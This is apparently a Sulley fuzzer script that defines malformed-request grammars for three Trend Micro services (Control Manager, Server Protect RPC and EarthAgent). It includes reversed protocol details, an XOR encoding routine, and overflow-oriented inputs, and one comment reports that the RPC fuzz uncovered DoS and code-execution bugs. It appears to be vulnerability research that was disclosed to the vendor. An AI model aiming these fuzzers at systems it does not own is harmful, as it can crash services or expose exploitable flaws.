from sulley import *

import struct

# crap ass trend xor "encryption" routine for control manager (20901)
def trend_xor_encode (str):
    '''
    Simple bidirectional XOR "encryption" routine used by this service.
    '''
    key = 0xA8534344
    ret = ""

    # pad to 4 byte boundary.
    pad = 4 - (len(str) % 4)

    if pad == 4:
        pad = 0

    str += "\x00" * pad

    while str:
        dword  = struct.unpack("<L", str[:4])[0]
        str    = str[4:]
        dword ^= key
        ret   += struct.pack("<L", dword)
        key    = dword

    return ret


# crap ass trend xor "encryption" routine for control manager (20901)
def trend_xor_decode (str):
    key = 0xA8534344
    ret = ""

    while str:
        dword = struct.unpack("<L", str[:4])[0]
        str   = str[4:]
        tmp   = dword
        tmp  ^= key
        ret  += struct.pack("<L", tmp)
        key   = dword

    return ret


# dce rpc request encoder used for trend server protect 5168 RPC service.
# opnum is always zero.
def rpc_request_encoder (data):
    return utils.dcerpc.request(0, data)


########################################################################################################################
s_initialize("20901")
"""
    Trend Micro Control Manager (DcsProcessor.exe)
    http://bakemono/mediawiki/index.php/Trend_Micro:Control_Manager

    This fuzz found nothing! need to uncover more protocol details. See also: pedram's pwned notebook page 3, 4.
"""

# dword 1, error: 0x10000001, do something:0x10000002, 0x10000003 (>0x10000002)
s_group("magic", values=["\x02\x00\x00\x10", "\x03\x00\x00\x10"])

# dword 2, size of body
s_size("body")

# dword 3, crc32(block) (copy from eax at 0041EE8B)
# TODO: CRC is non standard, nop out jmp at 0041EE99 and use bogus value:
#s_checksum("body", algorithm="crc32")
s_static("\xff\xff\xff\xff")

# the body of the trend request contains a variable number of (2-byte) TLVs
if s_block_start("body", encoder=trend_xor_encode):
    s_word(0x0000, full_range=True)     # completely fuzz the type
    s_size("string1", length=2)         # valid length
    if s_block_start("string1"):        # fuzz string
        s_string("A"*1000)
        s_block_end()

    s_random("\x00\x00", 2, 2)          # random type
    s_size("string2", length=2)         # valid length
    if s_block_start("string2"):        # fuzz string
        s_string("B"*10)
    s_block_end()

    # try a table overflow.
    if s_block_start("repeat me"):
        s_random("\x00\x00", 2, 2)      # random type
        s_size("string3", length=2)     # valid length
        if s_block_start("string3"):    # fuzz string
            s_string("C"*10)
            s_block_end()
    s_block_end()

    # repeat string3 a bunch of times.
    s_repeat("repeat me", min_reps=100, max_reps=1000, step=50)
s_block_end("body")


########################################################################################################################
"""
    Trend Micro Server Protect (SpNTsvc.exe)

    This fuzz uncovered a bunch of DoS and code exec bugs. The obvious code exec bugs were documented and released to
    the vendor. See also: pedram's pwned notebook page 1, 2.

    // opcode: 0x00, address: 0x65741030
    // uuid: 25288888-bd5b-11d1-9d53-0080c83a5c2c
    // version: 1.0

    error_status_t rpc_opnum_0 (
    [in] handle_t arg_1,                          // not sent on wire
    [in] long trend_req_num,
    [in][size_is(arg_4)] byte overflow_str[],
    [in] long arg_4,
    [out][size_is(arg_6)] byte arg_5[],           // not sent on wire
    [in] long arg_6
    );
"""

for op, submax in [(0x1, 22), (0x2, 19), (0x3, 85), (0x5, 25), (0xa, 49), (0x1f, 25)]:
    s_initialize("5168: op-%x" % op)
    if s_block_start("everything", encoder=rpc_request_encoder):
        # [in] long trend_req_num,
        s_group("subs", values=map(chr, range(1, submax)))
        s_static("\x00")                 # subs is actually a little endian word
        s_static(struct.pack("<H", op))  # opcode

        # [in][size_is(arg_4)] byte overflow_str[],
        s_size("the string")
        if s_block_start("the string", group="subs"):
            s_static("A" * 0x5000, name="arg3")
        s_block_end()

        # [in] long arg_4,
        s_size("the string")

        # [in] long arg_6
        s_static(struct.pack("<L", 0x5000)) # output buffer size
    s_block_end()


########################################################################################################################
s_initialize("5005")
"""
    Trend Micro Server Protect (EarthAgent.exe)
    
    Some custom protocol listening on TCP port 5005
"""

s_static("\x21\x43\x65\x87")      # magic
# command
s_static("\x00\x00\x00\x00")  # dunno
s_static("\x01\x00\x00\x00")  # dunno, but observed static
# length
s_static("\xe8\x03\x00\x00")  # dunno, but observed static
s_static("\x00\x00\x00\x00")  # dunno, but observed static
